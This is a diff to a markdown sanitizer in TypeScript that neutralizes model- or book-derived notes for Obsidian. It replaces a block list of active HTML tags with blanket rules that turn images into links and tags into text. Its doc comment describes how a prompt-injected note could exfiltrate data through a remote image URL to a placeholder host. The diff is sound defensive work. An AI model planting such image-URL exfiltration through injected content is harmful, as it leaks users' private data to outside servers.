@@ -179,15 +179,14 @@ export function sanitizeName(raw: string, max = 100): string | null {
   return RESERVED.test(s) ? `${s} (note)` : s;
 }
 
-/** HTML that runs code or fetches from the network as soon as a note is shown. */
-const ACTIVE_HTML = /<(\/?)(script|iframe|object|embed|img|image|picture|source|video|audio|track|svg|style|link|meta|base|frame|frameset)\b/gi;
-
 /**
  * Makes markdown that came from a model or a book inert in Obsidian. Code-running plugins (Dataview
- * JS, JS Engine, Templater) get plain text instead of code, and nothing loads from the network when
- * the note is opened: a remote image becomes a link, and HTML that fetches or runs is shown as text.
- * @research reads web pages, so a prompt-injected note must neither execute nor send what it
- * contains to a server (`![](https://host/?d=...)` would, the moment the note is viewed).
+ * JS, JS Engine, Templater) get plain text instead of code, and nothing loads or runs when the note is
+ * opened: every image becomes a link (an `![[embed]]` of a vault file stays), and every HTML tag is
+ * shown as text (`&lt;` looks the same). @research reads web pages, so a prompt-injected note must
+ * neither execute nor send what it contains to a server, the way `![](https://host/?d=...)` would the
+ * moment the note is viewed. Spotting only the remote or dangerous forms loses to encodings, nested
+ * brackets and reference definitions, so nothing of either kind is kept.
  */
 export function neutralize(md: string): string {
   return md
@@ -197,10 +196,8 @@ export function neutralize(md: string): string {
     )
     .replace(/`\$=/g, "`\\$=")
     .replace(/<%/g, "<\\%")
-    .replace(/!(\[[^\]\n]*\]\(\s*<?(?:[a-z][a-z0-9+.-]*:)?\/\/)/gi, "$1") // remote image -> link
-    .replace(/!(\[[^\]\n]*\]\[[^\]\n]*\])/g, "$1") // reference-style image -> link
-    .replace(/<(?=[a-z][^<>]*\burl\s*\()/gi, "&lt;") // a tag whose style loads url(...)
-    .replace(ACTIVE_HTML, "&lt;$1$2");
+    .replace(/!(?=\[(?!\[))/g, "") // an image of any form -> a link; ![[embeds]] stay
+    .replace(/<(?=\/?[a-z][a-z0-9-]*(?:[\s/>]|$))/gim, "&lt;"); // an HTML tag -> text; <https://...> autolinks stay
 }
 
 const HEADING = /^#{1,6}[ \t]+/;
